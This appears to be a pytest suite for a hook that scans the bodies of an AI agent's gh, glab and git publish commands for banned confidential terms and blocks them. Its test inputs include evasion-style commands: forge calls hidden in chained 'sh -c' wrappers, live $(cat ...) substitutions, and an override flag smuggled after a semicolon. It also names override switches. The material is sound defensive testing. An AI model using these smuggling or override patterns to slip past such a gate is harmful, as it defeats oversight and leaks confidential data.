    def test_glab_description_cat_subst_carries_banned_term(self, tmp_path: Path) -> None:
        body = tmp_path / "body.md"
        body.write_text("ship to acmecorp soon\n", encoding="utf-8")
        cmd = f'glab mr create -R o/r --title t --description "$(cat {body})"'
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert "acmecorp" in payload

    def test_gh_body_cat_subst_resolves_clean_body(self, tmp_path: Path) -> None:
        body = tmp_path / "body.md"
        body.write_text("a clean release note about the docs refresh\n", encoding="utf-8")
        cmd = f'gh pr create -R o/r --title t --body "$(cat {body})"'
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert "a clean release note" in payload
        assert FAIL_CLOSED_SENTINEL not in payload

    def test_cat_subst_quoted_path_resolves(self, tmp_path: Path) -> None:
        body = tmp_path / "spaced body.md"
        body.write_text("a clean release note here\n", encoding="utf-8")
        cmd = f"glab mr create -R o/r --title t --description \"$(cat '{body}')\""
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert "a clean release note" in payload
        assert FAIL_CLOSED_SENTINEL not in payload

    def test_cat_subst_missing_file_fails_closed(self) -> None:
        cmd = 'glab mr create -R o/r --title t --description "$(cat /no/such/cat-body-xyz.md)"'
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert FAIL_CLOSED_SENTINEL in payload


class TestEnvVarBodyResolution:
    """A ``--description``/``--body`` ``$VAR`` best-effort resolves from the hook env.

    The agent may pass a body via a shell variable
    (``--description "$BODY"``). The hook subprocess inherits the agent's
    environment, so a present variable resolves to its value; an absent
    variable is genuinely unresolvable and fails closed (the gate must scan
    the real body or block, never read the literal ``$VAR`` token).
    """

    def test_present_env_var_resolves_clean_body(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("PUBLISH_BODY", "a clean body from an env var")
        cmd = 'glab mr create -R o/r --title t --description "$PUBLISH_BODY"'
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert "a clean body from an env var" in payload
        assert FAIL_CLOSED_SENTINEL not in payload

    def test_present_env_var_carries_banned_term(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("PUBLISH_BODY", "ship to acmecorp soon")
        cmd = 'gh pr create -R o/r --title t --body "$PUBLISH_BODY"'
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert "acmecorp" in payload

    def test_absent_env_var_fails_closed(self, monkeypatch: pytest.MonkeyPatch) -> None:
        # An absent $VAR is a FUNDAMENTALLY-unavailable body source (the value
        # does not exist before the command runs), so it carries the distinct
        # unavailable sentinel (#2369) — still fails closed, with the actionable
        # "write the body to an absolute file" advice rather than "missing file".
        monkeypatch.delenv("PUBLISH_BODY_ABSENT", raising=False)
        cmd = 'glab mr create -R o/r --title t --description "$PUBLISH_BODY_ABSENT"'
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert UNAVAILABLE_BODY_SOURCE_SENTINEL in payload
        assert banned_terms_scanner.scan_text(payload) == banned_terms_scanner.UNAVAILABLE_BODY_SOURCE_MARKER


class TestMarkdownBacktickBodyResolves:
    """A ``--body`` with markdown inline-code backticks resolves to the body verbatim.

    Markdown PR/issue bodies routinely carry inline-code spans (a function
    name, a flag, a path in single backticks). The extracted ``--body`` value
    is a literal argv element the gate only SCANS -- it is never re-fed to a
    shell -- so a backtick is inert data, not a live command substitution. The
    resolver must return such a body so the banned-terms scan runs against the
    real text, rather than fail-closing on the presence of any backtick (which
    forced agents into ``--body-file``/heredoc workarounds).
    """

    def test_gh_body_with_backtick_inline_code_resolves_verbatim(self) -> None:
        body = "renamed the `resolve_inline_body_value` helper in the parser"
        cmd = f'gh pr create -R o/r --title t --body "{body}"'
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert "resolve_inline_body_value" in payload
        assert FAIL_CLOSED_SENTINEL not in payload

    def test_glab_description_with_backtick_inline_code_resolves_verbatim(self) -> None:
        body = "set `enabled = true` then run `t3 worktree start`"
        cmd = f'glab mr create -R o/r --title t --description "{body}"'
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert "t3 worktree start" in payload
        assert FAIL_CLOSED_SENTINEL not in payload

    def test_backtick_body_still_blocks_a_banned_term(self) -> None:
        # The fix only stops fail-closing on the backtick; the banned-terms scan
        # is untouched, so a real term inside a backtick body is still surfaced.
        body = "ship `the feature` to acmecorp next week"
        cmd = f'gh pr create -R o/r --title t --body "{body}"'
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert "acmecorp" in payload
        assert FAIL_CLOSED_SENTINEL not in payload


class TestOrdinaryWordsDoNotLookLikeOpaqueForgeTransport:
    """An ordinary English word carrying ``gh``/``glab``/``curl`` mid-word is not a forge marker.

    ``command_has_opaque_forge_transport`` flags a segment as an unscannable
    interpreter wrapper (``sh -c "gh ..."``) when a forge-tool marker appears
    in one of its tokens. The marker check used raw substring containment
    (``marker in token``), which matched "gh" inside ordinary words like
    "though", "night", "light", "right" -- so a clean ``t3 review
    post-comment`` NOTE merely containing one of these words was misclassified
    as hiding a forge call, and the gate appended the fail-closed sentinel to
    its OWN clean payload (#1415). ``t3`` is not in ``_PARSEABLE_FORGE_LEADERS``
    (it is not itself a forge tool), so every ``t3 review`` post reached this
    check. The fix matches a marker only at a token WORD BOUNDARY.
    """

    def _payload(self, note: str) -> str | None:
        command = f'''t3 review post-comment my-org/repo 7 --file x.py --line 1 -m "{note}"'''
        return banned_terms_scanner.extract_publish_payload("Bash", {"command": command})

    @pytest.mark.parametrize(
        "word",
        ["though", "night", "light", "right", "weight", "eight", "sigh", "high", "thought"],
    )
    def test_word_containing_gh_substring_does_not_fail_closed(self, word: str) -> None:
        payload = self._payload(f"clean note, {word} still applies here")
        assert payload is not None
        assert FAIL_CLOSED_SENTINEL not in payload
        assert word in payload

    def test_word_containing_gh_substring_does_not_block_a_real_banned_term(self) -> None:
        # The fix only stops the false-positive opaque-transport sentinel; a
        # genuine banned term in the same note must still be scanned/matched.
        payload = self._payload("though this mentions acmecorp directly")
        assert payload is not None
        assert "acmecorp" in payload
        assert FAIL_CLOSED_SENTINEL not in payload

    def test_opaque_wrapper_hiding_a_real_gh_token_still_fails_closed(self) -> None:
        # Regression guard: the word-boundary fix must not weaken detection of
        # an ACTUAL forge call hidden inside an opaque interpreter argument.
        cmd = 'glab mr create -R acme-internal/x --title ok && sh -c "gh pr create -R o/public --body acmecorp"'
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert FAIL_CLOSED_SENTINEL in payload

    def test_path_form_gh_marker_still_fails_closed(self) -> None:
        # A path-qualified marker (``/usr/bin/gh``) is still bounded by ``/``
        # on one side and end-of-token on the other, so it must still match.
        # The leading ``glab mr create`` segment is what makes the whole
        # command register as a publish in the first place.
        cmd = 'glab mr create -R acme-internal/x --title ok && sh -c "/usr/bin/gh pr create --body acmecorp"'
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert FAIL_CLOSED_SENTINEL in payload


class TestMixedCommandSubstitutionBodyStillFailsClosed:
    """A body whose ``$(...)`` substitution content the gate cannot read fails closed.

    Backticks being inert data does NOT relax the genuine
    command-substitution guard. A mixed ``"prefix $(cat <path>)"`` body's
    substitution content is unread (only the exact ``$(cat <path>)`` form is
    resolved), so passing the literal would let a leak inside it slip -- it
    still fails closed.
    """

    def test_mixed_dollar_paren_cat_subst_fails_closed(self) -> None:
        body = "release notes header $(cat /no/such/secret-xyz.md)"
        cmd = f'gh pr create -R o/r --title t --body "{body}"'
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert FAIL_CLOSED_SENTINEL in payload

    def test_bare_dollar_paren_subst_fails_closed(self) -> None:
        body = "$(printf nope)"
        cmd = f'gh pr create -R o/r --title t --body "{body}"'
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert FAIL_CLOSED_SENTINEL in payload


class TestInertSingleQuotedSubstitutionBodyIsScanned:
    """A SINGLE-quoted body that merely MENTIONS a ``$(...)`` is scanned, not blocked.

    Inside single quotes bash never expands a ``$(...)`` — it passes the text
    verbatim — so the body the gate decodes IS the published body, fully present
    and scannable. A multiline commit/PR/note body that documents a shell snippet
    (``ran $(date) to stamp``) used to hit the ``$(`` fail-closed branch and deny
    with "publish body could not be read", forcing ``--body-file``/heredoc
    workarounds on a perfectly readable body (#1415). The resolver now reads the
    value token's verbatim source span: a single-quoted ``$(...)`` is INERT and
    scanned; a double-quoted / unquoted one is LIVE and still fails closed
    (TestMixedCommandSubstitutionBodyStillFailsClosed above). The scan is NOT
    bypassed — a planted banned term in such a body is still caught.
    """

    def test_single_quoted_body_with_dollar_paren_is_scanned_not_failed_closed(self) -> None:
        body = "chore: stamp build\n\nran $(date) to record the build time"
        cmd = f"gh pr create -R o/r --title t --body '{body}'"
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert FAIL_CLOSED_SENTINEL not in payload
        assert "ran $(date) to record the build time" in payload

    def test_single_quoted_body_with_planted_banned_term_is_still_caught(self, config: Path) -> None:
        # ANTI-VACUOUS: the inert-substitution body is genuinely SCANNED, not
        # waved through. A banned term sitting next to the inert ``$(...)`` is
        # surfaced — proving the fix reads the body rather than bypassing it.
        body = "deploy steps\n\nrun $(make build) then ship to acmecorp"
        cmd = f"gh pr create -R o/r --title t --body '{body}'"
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert FAIL_CLOSED_SENTINEL not in payload
        assert banned_terms_scanner.scan_text(payload, config_path=config) == "acmecorp"

    def test_multiline_single_quoted_typographic_body_passes_clean(self, config: Path) -> None:
        # A clean multiline body with typographic chars (arrow U+2192, em-dash
        # U+2014) AND an inert ``$(...)`` snippet scans clean — no fail-closed,
        # no banned term.
        body = "flow: A → B — done\n\nset via $(git rev-parse HEAD) at deploy"
        cmd = f"gh pr create -R o/r --title t --body '{body}'"
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert FAIL_CLOSED_SENTINEL not in payload
        assert "→" in payload
        assert banned_terms_scanner.scan_text(payload, config_path=config) is None

    def test_git_commit_single_quoted_multiline_body_mentioning_subst_is_scanned(self) -> None:
        # Case 3: a plain ``git commit -m '<multiline body mentioning $(...)>'``
        # no longer trips "publish body could not be read". The commit IS a
        # publish surface (lands in public history) so it is still scanned —
        # but a single-quoted body bash passes verbatim is readable, not opaque.
        body = "chore: pin version\n\nstamped with $(date) in the release notes"
        cmd = f"git commit -m '{body}'"
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert FAIL_CLOSED_SENTINEL not in payload
        assert "stamped with $(date) in the release notes" in payload

    def test_double_quoted_live_subst_in_git_commit_still_fails_closed(self) -> None:
        # The security boundary holds: a DOUBLE-quoted ``$(...)`` in a commit body
        # IS expanded by bash, so the gate cannot see the real content and must
        # still fail closed — the fix only relaxes the provably-inert case.
        cmd = 'git commit -m "chore: pin\n\nstamped with $(cat /no/such/secret-zzz.md)"'
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert FAIL_CLOSED_SENTINEL in payload

    def test_t3_review_single_quoted_note_mentioning_subst_is_scanned(self) -> None:
        # Case 1: a multiline positional NOTE on a ``t3 review`` post that mentions
        # a ``$(...)`` snippet is scanned verbatim, not denied as unresolvable.
        note = "Review note.\n\nThe helper calls $(date) for the timestamp."
        cmd = f"t3 teatree review post-comment o/r 5 '{note}' --general"
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert FAIL_CLOSED_SENTINEL not in payload
        assert "The helper calls $(date) for the timestamp." in payload

    def test_t3_review_single_quoted_note_planted_term_is_still_caught(self, config: Path) -> None:
        # ANTI-VACUOUS for the NOTE path: a banned term in an inert-subst NOTE is
        # surfaced, proving the NOTE is scanned rather than bypassed.
        note = "Review note.\n\nrun $(make) before shipping to acmecorp"
        cmd = f"t3 teatree review post-comment o/r 5 '{note}' --general"
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert FAIL_CLOSED_SENTINEL not in payload
        assert banned_terms_scanner.scan_text(payload, config_path=config) == "acmecorp"


class TestDoubleQuotedApostropheLiveSubstitutionFailsClosed:
    """A DOUBLE-quoted body whose literal apostrophe precedes a LIVE ``$(...)`` fails closed.

    The fail-open regression this guards against: the raw-span walker toggled
    its single-quote flag on EVERY ``'`` without tracking double-quote context.
    Inside a double-quoted span an apostrophe is a LITERAL character, not a
    single-quote delimiter — so a genuinely LIVE ``$(...)`` after that apostrophe
    (``--body "it's $(cat secret)"`` — the whole body is one double-quoted string,
    bash WILL expand the substitution) was misclassified as INERT and the gate
    scanned the literal token instead of failing closed. A planted banned term
    inside that substitution leaked. The state machine now tracks both
    ``in_single`` and ``in_double``; the apostrophe is the ONLY difference between
    a leak and a correct fail-closed block.
    """

    def test_double_quoted_apostrophe_then_live_cat_subst_blocks(
        self, tmp_path: Path, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # PROOF (verifier): the whole body is one DOUBLE-quoted string; the inner
        # ``'`` is a literal apostrophe, so bash expands ``$(cat <file>)`` at post
        # time. The planted banned term in that file WOULD be published, so the
        # gate MUST fail closed (block). RED before the fix (the walker treats the
        # apostrophe as opening a single-quoted region and reports the live subst
        # INERT → scans the literal token → ALLOW/leak).
        secret = tmp_path / "secret.txt"
        secret.write_text("ship to acmecorp\n", encoding="utf-8")
        cmd = f'gh pr create -R o/r --title t --body "it\'s $(cat {secret})"'
        blocked = handle_banned_terms_pretool(_bash(cmd))
        assert blocked is True
        decision = json.loads(capsys.readouterr().out)
        assert decision["permissionDecision"] == "deny"

    def test_apostrophe_is_the_only_difference_from_failclosed_control(
        self, tmp_path: Path, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # CONTROL: the same body WITHOUT the apostrophe already fails closed today.
        # Proving both spellings block establishes the apostrophe is the only
        # difference — the live substitution is the real trigger, not the quote.
        secret = tmp_path / "secret.txt"
        secret.write_text("ship to acmecorp\n", encoding="utf-8")
        cmd = f'gh pr create -R o/r --title t --body "its $(cat {secret})"'
        blocked = handle_banned_terms_pretool(_bash(cmd))
        assert blocked is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"

    def test_double_quoted_apostrophe_live_subst_payload_fails_closed(self, tmp_path: Path) -> None:
        # The payload-level twin: the extracted publish payload must carry the
        # fail-closed sentinel (not the literal ``$(cat ...)`` token) because the
        # gate cannot read what bash will expand at post time.
        secret = tmp_path / "secret.txt"
        secret.write_text("anything\n", encoding="utf-8")
        cmd = f'gh pr create -R o/r --title t --body "it\'s $(cat {secret})"'
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert FAIL_CLOSED_SENTINEL in payload

    def test_double_quoted_apostrophe_live_subst_forge_transport_is_opaque(self) -> None:
        # SYMMETRIC case for ``_raw_has_live_substitution`` (the opaque-transport
        # detector). The trailing ``&& sh -c "…"`` segment is opaque ONLY because
        # of its LIVE substitution — the substitution is ``$(cat …)`` with NO
        # ``gh``/``glab``/``curl`` marker word, so the ``carries_forge`` branch
        # cannot fire and the verdict turns purely on substitution liveness. A
        # non-forge interpreter that runs a live ``$(…)`` could expand into ANY
        # forge call the gate cannot see, so it must fail closed. The leading real
        # publish segment makes this a publish command so the payload path runs.
        # RED before the fix: the literal apostrophe made the old single-quote-only
        # walker treat the rest of the double-quoted span as a single-quoted region
        # and report the genuinely LIVE ``$(cat …)`` INERT → the segment looked
        # clean → NO fail-closed sentinel was appended (the opaque transport
        # slipped through). The control WITHOUT the apostrophe already fails closed
        # — the apostrophe is the ONLY difference between a leak and a block.
        apos = 'gh pr create -R o/r --title t --body ok && sh -c "it\'s here: $(cat /tmp/payload.sh)"'
        ctrl = 'gh pr create -R o/r --title t --body ok && sh -c "its here: $(cat /tmp/payload.sh)"'
        apos_payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": apos})
        ctrl_payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": ctrl})
        assert apos_payload is not None
        assert ctrl_payload is not None
        # Both spellings must fail closed; the apostrophe must not flip the verdict.
        assert FAIL_CLOSED_SENTINEL in apos_payload
        assert FAIL_CLOSED_SENTINEL in ctrl_payload

    def test_genuinely_single_quoted_live_subst_in_double_then_inert_still_scanned(self) -> None:
        # The inverse boundary: a ``"…"`` double-quoted prefix that CLOSES, then a
        # genuinely single-quoted ``'$(date)'`` span, keeps the substitution INERT
        # — the state machine must still treat the truly-single-quoted region as
        # inert and SCAN the literal body, not fail closed.
        body = "header done"
        cmd = f"gh pr create -R o/r --title t --body \"{body}\"' literal $(date) here'"
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert FAIL_CLOSED_SENTINEL not in payload


class TestReadOnlyCommandsAreNotPublishes:
    """A read-only command that merely QUOTES a publish substring is NOT a post.

    The contiguous-substring publish detector re-emits every token of the
    whole command, so a ``grep "glab mr create"`` / ``rg "git commit -m"`` /
    ``cat | grep "gh issue create"`` argument used to be misread as a real
    publish -- the recurring false positive that blocked legitimate read-only
    inspection commands. Detection is keyed to a segment whose LEADING
    executable is an actual forge/publish tool, so a non-mutating
    grep/rg/cat/sed/awk/ls/head/tail that mentions the tokens is not scanned.
    """

    @pytest.mark.parametrize(
        "command",
        [
            'grep -rn "glab mr" --include="*.py" . | grep -- --description',
            'cat somefile | grep "glab mr create" | grep -- --description',
            'rg "glab mr create" src/',
            'grep -n "glab mr update" file.py',
            'sed -n "s/glab mr create/x/" file',
            'awk "/gh pr create/" file',
            'ls | grep "gh issue create"',
            'head -5 file | grep "glab mr note create"',
            'tail -n 20 log | grep "git commit -m"',
            'grep -rn "chat.postMessage" src/',
            'grep -rn "git commit --message" .',
        ],
    )
    def test_read_only_command_is_not_a_publish(self, command: str) -> None:
        assert _command_parser.is_publish_command(command) is False

    @pytest.mark.parametrize(
        "command",
        [
            "glab mr create -R o/r --title t --body x",
            "cd /wt && glab mr create -R o/r --title t",
            "gh issue create --title t --body x",
            'git commit -m "msg"',
            'git -C /wt commit -m "msg"',
            "curl -X POST https://slack.com/api/chat.postMessage -d text=hi",
            "t3 teatree notify send --message x",
        ],
    )
    def test_real_publish_command_stays_detected(self, command: str) -> None:
        assert _command_parser.is_publish_command(command) is True


class TestOverride:
    def test_flag_in_first_segment_bypasses(self) -> None:
        cmd = 'gh issue create --title t --body "acmecorp" --allow-banned-term'
        assert banned_terms_scanner.has_override("Bash", {"command": cmd}) is True

    def test_env_var_bypasses(self) -> None:
        tool_input = {"command": "gh issue create", "env": {"ALLOW_BANNED_TERM": "1"}}
        assert banned_terms_scanner.has_override("Bash", tool_input) is True

    def test_clean_command_has_no_override(self) -> None:
        assert banned_terms_scanner.has_override("Bash", {"command": "gh issue create --body x"}) is False

    def test_flag_after_metacharacter_does_not_bypass(self) -> None:
        # A flag smuggled into a second chained command must not bypass.
        cmd = 'gh issue create --body "acmecorp"; echo --allow-banned-term'
        assert banned_terms_scanner.has_override("Bash", {"command": cmd}) is False

    def test_non_bash_tool_has_no_flag_override(self) -> None:
        # A non-Bash tool can only override via the env mapping.
        assert banned_terms_scanner.has_override("Write", {"env": {"ALLOW_BANNED_TERM": "1"}}) is True
        assert banned_terms_scanner.has_override("Write", {}) is False


class TestScanTextNoOpWhenNothingToScan:
    """A genuine no-op (no config, no script) returns None — there is nothing to scan.

    These are NOT scanner failures: the missing-config / missing-script paths
    mirror ``check-banned-terms.sh``'s own no-op contract (no config ⇒ exit 0).
    A scanner *crash* is the opposite case and must fail CLOSED — see
    ``TestScanTextScannerCrashFailsClosed``.
    """

    def test_missing_script_is_a_noop(self, config: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr(banned_terms_scanner, "_scanner_script", lambda: Path("/nonexistent/check.sh"))
        assert banned_terms_scanner.scan_text("acmecorp", config_path=config) is None

    def test_missing_config_is_a_noop(self, tmp_path: Path) -> None:
        assert banned_terms_scanner.scan_text("acmecorp", config_path=tmp_path / "absent.toml") is None


class TestScanTextScannerCrashFailsClosed:
    """A scanner that could not run must BLOCK, never ALLOW (#1954).

    A security gate that fails OPEN on a crash is the bug class: on a machine
    where the shell fallback resolves to an old system ``python3`` (the repo
    requires >= 3.13), importing the matcher crashes and the gate silently
    stopped scanning — a leak-on-misconfig. Every degraded scanner outcome
    now returns the ``SCANNER_UNAVAILABLE_MARKER`` (the gate blocks), instead
    of ``None`` (the gate allowed).
    """

    def test_subprocess_oserror_fails_closed(self, config: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        def _boom(*_args: object, **_kwargs: object) -> None:
            raise OSError

        monkeypatch.setattr(banned_terms_scanner, "run_allowed_to_fail", _boom)
        assert (
            banned_terms_scanner.scan_text("acmecorp", config_path=config)
            == banned_terms_scanner.SCANNER_UNAVAILABLE_MARKER
        )

    def test_unexpected_exit_code_fails_closed(self, config: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        # An exit code outside {0, 1} (the script itself failed) raises
        # CommandFailedError inside run_allowed_to_fail — the gate must block.
        def _crash(*_args: object, **_kwargs: object) -> None:
            raise banned_terms_scanner.CommandFailedError(["check"], 2, "", "boom")

        monkeypatch.setattr(banned_terms_scanner, "run_allowed_to_fail", _crash)
        assert (
            banned_terms_scanner.scan_text("acmecorp", config_path=config)
            == banned_terms_scanner.SCANNER_UNAVAILABLE_MARKER
        )

    def test_timeout_fails_closed(self, config: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        def _hang(*_args: object, **_kwargs: object) -> None:
            raise banned_terms_scanner.TimeoutExpired(cmd=["check"], timeout=10)

        monkeypatch.setattr(banned_terms_scanner, "run_allowed_to_fail", _hang)
        assert (
            banned_terms_scanner.scan_text("acmecorp", config_path=config)
            == banned_terms_scanner.SCANNER_UNAVAILABLE_MARKER
        )

    def test_exit_one_with_empty_stdout_fails_closed(self, config: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        # THE precise #1954 import-crash shape: the scanner exits 1 (a Python
        # traceback's exit code, which collides with "banned term found") but
        # prints NOTHING on stdout (the traceback went to stderr). Treating
        # exit 1 + empty report as a clean scan is the fail-open: there is no
        # parseable BANNED TERM report, so the scanner did not actually run.
        class _CrashResult:
            returncode = 1
            stdout = ""
            stderr = "Traceback (most recent call last):\nImportError: PEP 604 union\n"

        monkeypatch.setattr(banned_terms_scanner, "run_allowed_to_fail", lambda *_a, **_k: _CrashResult())
        assert (
            banned_terms_scanner.scan_text("we ship to acmecorp", config_path=config)
            == banned_terms_scanner.SCANNER_UNAVAILABLE_MARKER
        )

    def test_exit_one_with_real_report_still_returns_the_term(
        self, config: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # The must-FLAG counterpart: a genuine banned-term hit (exit 1 WITH a
        # parseable report) must still return the matched term, not the crash
        # marker. The crash detection keys on an EMPTY report, not on exit 1.
        class _HitResult:
            returncode = 1
            stdout = "BANNED TERM in /tmp/x.txt:\n  1:ship to acmecorp\n\nBanned terms: acmecorp\n"
            stderr = ""

        monkeypatch.setattr(banned_terms_scanner, "run_allowed_to_fail", lambda *_a, **_k: _HitResult())
        assert banned_terms_scanner.scan_text("ship to acmecorp", config_path=config) == "acmecorp"


class TestMatchedTerm:
    def test_term_in_flagged_line_is_reported(self) -> None:
        report = "BANNED TERM in /tmp/x.txt:\n  1:ship to acmecorp\n\nBanned terms: acmecorp, widgetco\n"
        assert banned_terms_scanner._matched_term(report) == "acmecorp"

    def test_falls_back_to_first_configured_term_when_no_flagged_line_matches(self) -> None:
        # The script reported a match but the term substring is not in any
        # flagged line we parsed — report the first configured term so the
        # deny reason is never empty.
        report = "BANNED TERM in /tmp/x.txt:\n\nBanned terms: acmecorp, widgetco\n"
        assert banned_terms_scanner._matched_term(report) == "acmecorp"

    def test_empty_report_returns_none(self) -> None:
        assert banned_terms_scanner._matched_term("") is None


@pytest.mark.integration
class TestHookHandlerEndToEnd:
    def test_clean_body_passes(self, capsys: pytest.CaptureFixture[str]) -> None:
        blocked = handle_banned_terms_pretool(_bash('gh issue create --title t --body "ship next week"'))
        assert blocked is False
        assert capsys.readouterr().out == ""

    def test_banned_term_body_blocks(self, capsys: pytest.CaptureFixture[str]) -> None:
        blocked = handle_banned_terms_pretool(
            _bash('gh issue create -R souliane/teatree --title t --body "ship to acmecorp"')
        )
        assert blocked is True
        decision = json.loads(capsys.readouterr().out)
        assert decision["permissionDecision"] == "deny"
        assert "acmecorp" in decision["permissionDecisionReason"]

    def test_body_file_is_read_and_blocks(self, tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
        body_file = tmp_path / "issue_body.md"
        body_file.write_text("This affects acmecorp's deployment.\n", encoding="utf-8")
        blocked = handle_banned_terms_pretool(
            _bash(f"gh pr create -R souliane/teatree --title t --body-file {body_file}")
        )
        assert blocked is True
        decision = json.loads(capsys.readouterr().out)
        assert decision["permissionDecision"] == "deny"
        assert "acmecorp" in decision["permissionDecisionReason"]

    def test_write_then_post_clean_body_via_body_file_passes(self, capsys: pytest.CaptureFixture[str]) -> None:
        # The indirection-body bug: a clean body materialised with printf into a
        # mktemp file and posted via --body-file used to fail closed on EVERY
        # body. It must now resolve and pass the gate.
        cmd = 'f=$(mktemp); printf "%s" "ship next week" > "$f"; gh pr comment 5 --repo o/r --body-file "$f"'
        blocked = handle_banned_terms_pretool(_bash(cmd))
        assert blocked is False
        assert capsys.readouterr().out == ""

    def test_write_then_post_banned_body_via_body_file_blocks(self, capsys: pytest.CaptureFixture[str]) -> None:
        # The gate checks the RESOLVED body content, not a placeholder, so a
        # banned term written via printf and posted via --body-file is blocked.
        cmd = 'f=$(mktemp); printf "%s" "ship to acmecorp" > "$f"; gh pr comment 5 --repo o/r --body-file "$f"'
        blocked = handle_banned_terms_pretool(_bash(cmd))
        assert blocked is True
        decision = json.loads(capsys.readouterr().out)
        assert decision["permissionDecision"] == "deny"
        assert "acmecorp" in decision["permissionDecisionReason"]

    def test_unresolvable_body_file_still_fails_closed(self, capsys: pytest.CaptureFixture[str]) -> None:
        # A --body-file whose body is NOT written in-command and is not on disk
        # is genuinely unresolvable — the gate must STILL block (fail closed),
        # never pass an unscanned public body.
        blocked = handle_banned_terms_pretool(_bash('gh pr comment 5 --repo o/r --body-file "$BODY"'))
        assert blocked is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"

    def test_unresolvable_body_deny_message_is_not_a_banned_term(self, capsys: pytest.CaptureFixture[str]) -> None:
        # The false-positive: an unresolvable body used to surface the internal
        # sentinel as the "banned term", making the deny read "the body carries
        # the banned term '<unresolved publish body>'". The message must instead
        # explain the body could not be read.
        handle_banned_terms_pretool(_bash('gh pr comment 5 --repo o/r --body-file "$BODY"'))
        reason = json.loads(capsys.readouterr().out)["permissionDecisionReason"]
        assert "<unresolved publish body>" not in reason
        assert "banned term" not in reason
        assert "--allow-banned-term" not in reason

    def test_gh_short_body_file_flag_is_read_and_blocks(
        self, tmp_path: Path, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # ``gh issue/pr create|comment``'s ``-F`` is the short form of
        # ``--body-file``. A banned term in the ``-F`` file posted to a PUBLIC
        # target must be read and blocked, exactly like the long ``--body-file``
        # form. (RED before the fix: ``gh`` ``-F`` routed to the api-field
        # walker, the file went unread, and the term slipped through.)
        body_file = tmp_path / "issue_body.md"
        body_file.write_text("This affects acmecorp's deployment.\n", encoding="utf-8")
        blocked = handle_banned_terms_pretool(_bash(f"gh pr create -R souliane/teatree --title t -F {body_file}"))
        assert blocked is True
        decision = json.loads(capsys.readouterr().out)
        assert decision["permissionDecision"] == "deny"
        assert "acmecorp" in decision["permissionDecisionReason"]

    def test_gh_short_body_file_flag_to_private_target_is_allowed(
        self, tmp_path: Path, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # Over-block guard: the SAME ``-F`` file posted to a provably-private
        # ``-R`` target (in the internal_publish_namespaces allowlist) is
        # skipped by the destination gate before the payload is scanned, so a
        # private repo's own domain words are allowed.
        body_file = tmp_path / "issue_body.md"
        body_file.write_text("This affects acmecorp's deployment.\n", encoding="utf-8")
        blocked = handle_banned_terms_pretool(_bash(f"gh pr create -R internalcorp/svc --title t -F {body_file}"))
        assert blocked is False
        assert capsys.readouterr().out == ""

    def test_gh_attached_short_body_file_flag_is_read_and_blocks(
        self, tmp_path: Path, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # The attached short-option spelling ``-F<path>`` (no space) is also the
        # ``--body-file`` form: its file body is read and a banned term blocks.
        body_file = tmp_path / "issue_body.md"
        body_file.write_text("This affects acmecorp's deployment.\n", encoding="utf-8")
        blocked = handle_banned_terms_pretool(_bash(f"gh pr create -R souliane/teatree --title t -F{body_file}"))
        assert blocked is True
        decision = json.loads(capsys.readouterr().out)
        assert decision["permissionDecision"] == "deny"
        assert "acmecorp" in decision["permissionDecisionReason"]

    def test_gh_short_field_assignment_stays_an_api_field(self, capsys: pytest.CaptureFixture[str]) -> None:
        # Disambiguation guard: a ``gh api -F body=...`` field assignment is NOT
        # a file reference; the banned term in the inline field value is still
        # scanned and blocks, unchanged by the ``-F`` body-file handling.
        blocked = handle_banned_terms_pretool(_bash("gh api repos/souliane/teatree/issues -F title=t -F body=acmecorp"))
        assert blocked is True
